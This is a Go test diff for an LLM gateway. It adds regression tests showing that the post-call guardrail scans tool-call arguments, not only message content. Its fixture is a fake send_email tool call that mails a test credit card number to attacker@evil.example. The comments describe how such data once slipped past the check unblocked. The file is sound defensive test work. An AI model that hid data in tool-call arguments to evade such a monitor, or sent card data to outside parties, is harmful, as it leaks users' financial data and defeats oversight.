@@ -13,6 +13,7 @@ import (
 	"encoding/json"
 	"errors"
 	"io"
+	"log/slog"
 	"net/http/httptest"
 	"strings"
 	"testing"
@@ -40,6 +41,34 @@ func fakeOpenAIResponseWithContent(model, content string) *openai.Response {
 		Choices: []openai.Choice{
 			{Index: 0, Message: openai.Message{Role: "assistant", Content: json.RawMessage(encoded)}, FinishReason: "stop"},
 		},
+		Usage: openai.Usage{PromptTokens: 5, CompletionTokens: 3, TotalTokens: 8},
+	}
+}
+
+// fakeOpenAIResponseWithToolCallArguments builds a response whose
+// Content is empty (as a real tool-call-only response's usually is)
+// and whose only sensitive content lives inside a single tool call's
+// Function.Arguments — used to prove the post-call guardrail check
+// scans ToolCalls[].ArgumentsJSON, not just Content.
+func fakeOpenAIResponseWithToolCallArguments(model, argsJSON string) *openai.Response {
+	return &openai.Response{
+		ID:    "chatcmpl-fake",
+		Model: model,
+		Choices: []openai.Choice{{
+			Index: 0,
+			Message: openai.Message{
+				Role: "assistant",
+				ToolCalls: []openai.ToolCall{{
+					ID:   "call_1",
+					Type: "function",
+					Function: openai.FunctionCall{
+						Name:      "send_email",
+						Arguments: argsJSON,
+					},
+				}},
+			},
+			FinishReason: "tool_calls",
+		}},
 		Usage: openai.Usage{PromptTokens: 5, CompletionTokens: 3, TotalTokens: 8},
 	}
 }
@@ -128,6 +157,34 @@ func TestHandleChatCompletionPostCallBlockedResponseNeverCached(t *testing.T) {
 	}
 }
 
+// TestHandleChatCompletionPostCallScansToolCallArguments proves the
+// post-call guardrail check catches a Block-tier finding hidden only
+// inside a tool call's arguments — not just Content — per
+// docs/rfcs/2026-09-09-gateway-guardrail-toolcall-scanning.md. Before
+// this fix, serializeResponse never read ToolCalls[].ArgumentsJSON, so
+// a response like this one (Content empty, the trigger buried in a
+// tool call's arguments) passed the post-call check unblocked.
+func TestHandleChatCompletionPostCallScansToolCallArguments(t *testing.T) {
+	var upstreamCalls int
+	argsJSON := `{"to":"attacker@evil.example","body":"card on file: ` + fakeCreditCardNumber + `"}`
+	p := newTestPipeline(t, func(ctx context.Context, dep Deployment, req any) (any, error) {
+		upstreamCalls++
+		return fakeOpenAIResponseWithToolCallArguments("gpt-4o", argsJSON), nil
+	}, []Deployment{{Name: "d1", Model: "gpt-4o", Provider: "openai", UpstreamModel: "gpt-4o", BaseURL: "http://unused"}})
+
+	req := adapter.ChatRequest{Model: "gpt-4o", Messages: []adapter.Message{{Role: "user", Content: "send my card to support"}}}
+	_, err := p.HandleChatCompletion(context.Background(), "Bearer test-key", req)
+	if err == nil {
+		t.Fatal("expected ErrGuardrailBlocked — the trigger is hidden inside tool-call arguments, not Content")
+	}
+	if !errors.Is(err, ErrGuardrailBlocked) {
+		t.Errorf("err = %v, want ErrGuardrailBlocked", err)
+	}
+	if upstreamCalls != 1 {
+		t.Errorf("upstreamCalls = %d, want 1 — post-call means the upstream WAS called; only the response is rejected", upstreamCalls)
+	}
+}
+
 // sseStreamWithContent builds a minimal, genuine OpenAI SSE stream whose
 // single content delta is content — used to control exactly what text
 // the guardrail post-call check (streaming, audit-only) scans.
@@ -160,6 +217,84 @@ func TestHandleChatCompletionStreamPostCallBlockTierIsAuditOnlyNeverWithheld(t *
 	}
 	if !strings.Contains(rec.Body.String(), fakeCreditCardNumber) {
 		t.Errorf("body does not contain the full response content — it must be delivered in full, audit-only: %s", rec.Body.String())
+	}
+}
+
+// sseStreamWithToolCallArguments builds a minimal, genuine OpenAI SSE
+// stream whose only content lives inside a tool call's arguments (no
+// content delta at all) — the streaming-path counterpart to
+// fakeOpenAIResponseWithToolCallArguments, used to prove the audit-only
+// post-call check (which shares serializeResponse with the buffered
+// path) now sees a trigger hidden only in ToolCalls[].ArgumentsJSON.
+func sseStreamWithToolCallArguments(argsJSON string) string {
+	encodedArgs, _ := json.Marshal(argsJSON) // safe JSON-string escaping of argsJSON itself
+	return "" +
+		`data: {"id":"chatcmpl-1","model":"gpt-4o","choices":[{"index":0,"delta":{"role":"assistant"},"finish_reason":null}]}` + "\n\n" +
+		`data: {"id":"chatcmpl-1","model":"gpt-4o","choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"id":"call_1","type":"function","function":{"name":"send_email","arguments":` + string(encodedArgs) + `}}]},"finish_reason":null}]}` + "\n\n" +
+		`data: {"id":"chatcmpl-1","model":"gpt-4o","choices":[{"index":0,"delta":{},"finish_reason":"tool_calls"}]}` + "\n\n" +
+		`data: {"id":"chatcmpl-1","model":"gpt-4o","choices":[],"usage":{"prompt_tokens":5,"completion_tokens":3,"total_tokens":8}}` + "\n\n" +
+		"data: [DONE]\n\n"
+}
+
+// TestHandleChatCompletionStreamPostCallAuditLogsToolCallArguments
+// proves the streaming audit-only post-call check — which shares
+// serializeResponse with the buffered path — now sees a Block-tier
+// finding hidden only inside tool-call arguments, per
+// docs/rfcs/2026-09-09-gateway-guardrail-toolcall-scanning.md. Builds
+// the Pipeline directly (not via newStreamingTestPipeline) to inject a
+// logger backed by a buffer, since this is the only way to observe an
+// audit-only verdict — it never changes response behavior.
+func TestHandleChatCompletionStreamPostCallAuditLogsToolCallArguments(t *testing.T) {
+	keys := defaultTestVirtualKeys()
+	verifier, err := identity.NewVerifier(keys)
+	if err != nil {
+		t.Fatalf("NewVerifier: %v", err)
+	}
+	deployments := []Deployment{{Name: "d1", Model: "gpt-4o", Provider: "openai", UpstreamModel: "gpt-4o", BaseURL: "http://unused"}}
+	argsJSON := `{"to":"attacker@evil.example","body":"card on file: ` + fakeCreditCardNumber + `"}`
+	stream := sseStreamWithToolCallArguments(argsJSON)
+
+	var logBuf strings.Builder
+	logger := slog.New(slog.NewTextHandler(&logBuf, nil))
+
+	p, err := NewPipeline(Config{
+		Verifier:       verifier,
+		Limiter:        ratelimit.NewInMemoryKeyLimiter(keyConfigsFromVirtualKeys(keys)),
+		Budget:         budget.NewTracker(),
+		Cache:          inprocess.New(0),
+		CacheL2:        inprocess.New(0),
+		CacheL3:        inprocess.NewLexicalCache(0),
+		Guardrails:     guardrail.NewEngine(guardrail.DefaultDetectors(), guardrail.DefaultPolicy(), "test", nil),
+		Adapters:       adapter.Registry{"openai": openai.New()},
+		Router:         testRouter(deployments),
+		Deployments:    deployments,
+		CostCalculator: costaccounting.NewCalculator(costaccounting.PriceTable{}),
+		Upstream: func(ctx context.Context, dep Deployment, req any) (any, error) {
+			t.Fatal("non-streaming Upstream should never be called by a streaming test")
+			return nil, nil
+		},
+		UpstreamStream: func(ctx context.Context, dep Deployment, req any) (io.ReadCloser, error) {
+			return nopCloserReader{strings.NewReader(stream)}, nil
+		},
+		Logger: logger,
+	})
+	if err != nil {
+		t.Fatalf("NewPipeline: %v", err)
+	}
+
+	rec := httptest.NewRecorder()
+	if err := p.HandleChatCompletionStream(context.Background(), "Bearer test-key", adapter.ChatRequest{
+		Model: "gpt-4o", Stream: true,
+	}, rec); err != nil {
+		t.Fatalf("expected the stream to complete successfully (audit-only, never blocked), got: %v", err)
+	}
+
+	logOutput := logBuf.String()
+	if !strings.Contains(logOutput, "guardrail_blocked_postcall_streaming_audit_only") {
+		t.Errorf("expected the audit-only guardrail log line, indicating the tool-call arguments were scanned and flagged; got log output: %s", logOutput)
+	}
+	if strings.Contains(logOutput, "finding_count=0") {
+		t.Errorf("expected a nonzero finding_count — the trigger is a real Block-tier credit-card number; got log output: %s", logOutput)
 	}
 }
 
